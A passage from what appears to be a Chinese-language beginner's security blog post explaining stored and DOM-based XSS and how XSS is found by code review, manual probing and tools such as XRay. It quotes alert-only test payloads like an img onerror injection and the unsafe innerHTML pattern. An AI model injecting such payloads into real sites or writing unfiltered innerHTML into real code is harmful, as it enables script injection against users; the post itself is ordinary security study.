&lt;p>和反射型差不多，不同的是注入的 JS 被持久化到了服务端，比如上面的用户名注入点是从数据库提取的，那么把用户名改成 &lt;code>&amp;lt;img src=1 onerror=alert(1)/&amp;gt;&lt;/code>，每次访问这个页面都会触发脚本了，威胁比反射型 XSS 更大。&lt;/p>
&lt;h4 id="dom型">DOM型&lt;/h4>
&lt;p>DOM 型和上面其他 XSS 的主要区别在于不经过服务器，像是现在大前端常见的 SPA ，路由都在前端，后端只有 API 不负责渲染网页。如果前端应用里出现 &lt;code>elem.innerHTML=userinput&lt;/code>，&lt;code>userinput&lt;/code>没好好过滤的情况，就是个 DOM 型的 XSS 漏洞。&lt;/p>
&lt;h3 id="测试">测试&lt;/h3>
&lt;h4 id="代码审计">代码审计&lt;/h4>
&lt;p>目前对代码审计的理解就是 review 源码来尝试发现漏洞，大概只对开源代码或前端代码有用。没代码的话审计就有点逆向的意思了。XSS 漏洞可以从审计中发现，比如 &lt;a class="link" href="https://www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html" target="_blank" rel="noopener"
>一次对 Tui Editor XSS 的挖掘与分析&lt;/a>。&lt;/p>
&lt;h4 id="手动测试">手动测试&lt;/h4>
&lt;p>手工测试就是在可能的 XSS 注入点提交诸如 &lt;code>&amp;lt;img/onerror=alert(1)&amp;gt;&lt;/code>一类的内容，观察提交的内容是怎么转义的，提交内容如何渲染，再尝试修改 payload 来绕过防护，直至成功或失败。&lt;/p>
&lt;h4 id="自动测试">自动测试&lt;/h4>
&lt;p>尚不清楚自动 XSS 测试的原理，工具有 &lt;a class="link" href="https://github.com/chaitin/xray" target="_blank" rel="noopener"
>XRay&lt;/a> 。个人猜测至少两条路子：&lt;/p>
&lt;ol>
&lt;li>对能访问源码的情况可以自动源码审计，找出危险的赋值或调用。&lt;/li>
&lt;li>不能访问源码的情况下：
&lt;ol>
&lt;li>尝试判断底层框架，使用已知漏洞的 exploit 测试&lt;/li>
&lt;li>根据一定的规则，在可能的表单提交点尝试一系列 payload&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>实际上我觉得更像是半自动的，比如不涉及源码的情况下至少应该需要配置下要尝试的注入点（以及如何检测注入是否成功的页面）和指定 payload 类型，不然注入点的表单都填不满。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>我倒是想再加个实战环节，但现在找个足够简单的 XSS 还挺难的。vulhub 有个 drupal 的 XSS 虽然能跑，但单纯跑一下 PoC 着实没什么乐趣可言。重复一次别人做过的分析倒是可以，但有点超出写这篇博客时的计划了，于是暂时不管，走马观花为主，先对整个安全体系建立概念再由点带面入门。&lt;/p></description></item></channel></rss>